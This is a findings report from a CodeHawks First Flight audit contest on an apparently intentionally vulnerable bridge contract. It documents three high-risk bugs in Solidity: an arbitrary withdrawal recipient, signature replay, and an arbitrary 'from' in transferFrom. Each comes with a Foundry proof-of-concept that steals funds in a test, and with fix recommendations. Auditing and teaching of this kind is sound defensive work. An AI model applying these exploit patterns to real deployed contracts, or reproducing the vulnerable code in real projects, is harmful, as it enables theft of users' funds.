# First Flight #4: Boss Bridge - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. withdrawTokensToL1 permits to sends tokens to arbitrary user - steal funds](#H-01)
  - ### [H-02. replay attack on withdrawTokensToL1 - steal funds](#H-02)
  - ### [H-03. arbitrary from in safeTransferFrom in depositTokensToL2 - steal funds](#H-03)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #4

### Dates: Nov 9th, 2023 - Nov 15th, 2023

[See more contest details here](https://www.codehawks.com/contests/clomptuvr0001ie09bzfp4nqw)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 3
- Medium: 0
- Low: 0

# High Risk Findings

## <a id='H-01'></a>H-01. withdrawTokensToL1 permits to sends tokens to arbitrary user - steal funds

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L91

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L99

## Summary

The function `L1BossBridge::withdrawTokensToL1` permits to sends token from vault to arbitrary user passed as argument.

```solidity
    function withdrawTokensToL1(
@>      address to,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        sendToL1(
            v,
            r,
            s,
            abi.encode(
                address(token),
                0, // value
                abi.encodeCall(
                    IERC20.transferFrom,
@>                  (address(vault), to, amount)
                )
            )
        );
    }
```

## Vulnerability Details

The function `L1BossBridge::withdrawTokensToL1` gets the target address as an argument and use it inside the `abi.encodeCall` function to create the message to pass to the function `sendToL1`.
The function `sendToL1` call the function `IERC20.transferFrom(address(vault), to, amount)` on the `address(token)` and transfer the token from the vault to the attacker address.

Here a simple test to verify the vulnerability:

<details>

<summary>Code:</summary>

```solidity
function testAttackerCanStealTokensWithWithdrawFunction() public {
        // A user deposit tokens on the vault
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));
        uint256 user2InitialBalance = token.balanceOf(address(user2));
        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(
            token.balanceOf(address(user)),
            userInitialBalance - depositAmount
        );

        // User2 steal tokens from the vault without any previous deposit
        vm.startPrank(user2);
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(user2, depositAmount),
            operator.key
        );
        tokenBridge.withdrawTokensToL1(user2, depositAmount, v, r, s);
        assertEq(
            token.balanceOf(address(user2)),
            user2InitialBalance + depositAmount
        );
        assertEq(token.balanceOf(address(vault)), 0);
    }
```

</details>

## Impact

An attacker can steal tokens from the vault with the function withdrawTokensToL1.

## Tools Used

Foundry test + manual check

## Recommendations

One possible solution is to keep track of the balance of tokens that each user deposits and withdraws.
It is also necessary to manage access to the withdraw function only for users who have made a deposit.

## <a id='H-02'></a>H-02. replay attack on withdrawTokensToL1 - steal funds

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L112-L125

## Summary

No check is made on the signature sent to make a withdrawal to verify whether it has already been used or not.
By calling `L1BossBridge::withdrawTokensToL1` several times you can withdraw the funds several times.

## Vulnerability Details

The function `L1BossBridge::withdrawTokensToL1` does not verify the signature of the transaction, so an attacker can withdraw funds multiple times after first making a deposit and making a first withdrawal.

I created a test to verify the vulnerability.
First I updated the file `L1TokenBridge.t.sol` adding some variables.

```diff
    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
+   address user2 = makeAddr("user2");
    address userInL2 = makeAddr("userInL2");
+   address user2InL2 = makeAddr("user2InL2");
    Account operator = makeAccount("operator");

    token = new L1Token();
    token.transfer(address(user), 1000e18);
+   token.transfer(address(user2), 1000e18);
```

After that I created this test in the same file:

<details>

<summary>Code</summary>

```solidity
function testUserCanWithdrawTokensTwiceWithOperatorSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));
        uint256 user2InitialBalance = token.balanceOf(address(user2));

        // User deposit 10e18 tokens
        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        // User2 deposit 10e18 tokens
        vm.startPrank(user2);
        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user2, user2InL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount * 2);
        assertEq(
            token.balanceOf(address(user)),
            userInitialBalance - depositAmount
        );
        assertEq(
            token.balanceOf(address(user2)),
            user2InitialBalance - depositAmount
        );

        // Create a signature
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(user, depositAmount),
            operator.key
        );
        // Withdraw 10e18 tokens first time with the signature
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);

        assertEq(token.balanceOf(address(user)), userInitialBalance);
        assertEq(token.balanceOf(address(vault)), depositAmount);

        // Withdraw 10e18 tokens second time with the same signature
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);

        assertEq(
            token.balanceOf(address(user)),
            userInitialBalance + depositAmount
        );
        assertEq(token.balanceOf(address(vault)), 0);
    }
```

</details>

## Impact

Funds can be stolen.

## Tools Used

Manual check + Foundry Test.

## Recommendations

Add a nonce inside the signature and use it to verify if the signature is used or not or enter a timestamp and discard transactions that are too old.

## <a id='H-03'></a>H-03. arbitrary from in safeTransferFrom in depositTokensToL2 - steal funds

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L74

## Summary

The function `L1BossBridge::depositTokensToL2` accept as param an arbitrary address and it use this address inside safeTransferFrom instead of using msg.sender.

## Vulnerability Details

```solidity
@>  function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
@>      token.safeTransferFrom(from, address(vault), amount);

        // Our off-chain service picks up this event and mints the corresponding tokens on L2
        emit Deposit(from, l2Recipient, amount);
    }
```

The function `L1BossBridge::depositTokensToL2` accepts the `from` address as a parameter.
The `from` address is used inside the `safeTransferFrom` function to move the amount of tokens from the `from` address to the vault, and after that the L2 will move the funds to the `l2Recipient` address.
An attacker can insert as `from` an address of another user and steal funds.

Here a test to verify the attack:

<details>

<summary>Code</summary>

```solidity
function testAttackerCanStealTokens() public {
        vm.startPrank(user);
        // The victim approve 10e18 tokens to transfer
        // But move only a part at the moment
        uint256 amountToApprove = 10e18;
        uint256 amountToSend = 2e18;
        uint256 amountToSteal = 5e18;
        token.approve(address(tokenBridge), amountToApprove);

        // Initial balance of the victim: 1000000000000000000000
        console2.log(token.balanceOf(address(user)));

        // The victim deposit 2e18
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, userInL2, amountToSend);
        tokenBridge.depositTokensToL2(user, userInL2, amountToSend);

        // The balance of the victim after his deposit: 998000000000000000000
        console2.log(token.balanceOf(address(user)));

        // The attacker steals 5e18 to the victim
        vm.startPrank(user2);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, user2InL2, amountToSteal);
        tokenBridge.depositTokensToL2(user, user2InL2, amountToSteal);

        // The balance of the victim after the attack: 993000000000000000000
        console2.log(token.balanceOf(address(user)));

        assertEq(token.balanceOf(address(tokenBridge)), 0);
        assertEq(token.balanceOf(address(vault)), amountToSend + amountToSteal);
        vm.stopPrank();
    }
```

</details>

## Impact

An attacker can steal funds to another user that have approved a amount greater than the amount he had transferred.

## Tools Used

Manual check + Foundry test

## Recommendations

It is better use `msg.sender` and not an arbitrary `from` address in transferFrom.

```diff
    function depositTokensToL2(
-       address from,
        address l2Recipient,
        uint256 amount
    ) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-       token.safeTransferFrom(from, address(vault), amount);
+       token.safeTransferFrom(msg.sender, address(vault), amount);

        // Our off-chain service picks up this event and mints the corresponding tokens on L2
-       emit Deposit(from, l2Recipient, amount);
+       emit Deposit(msg.sender, l2Recipient, amount);
    }
```
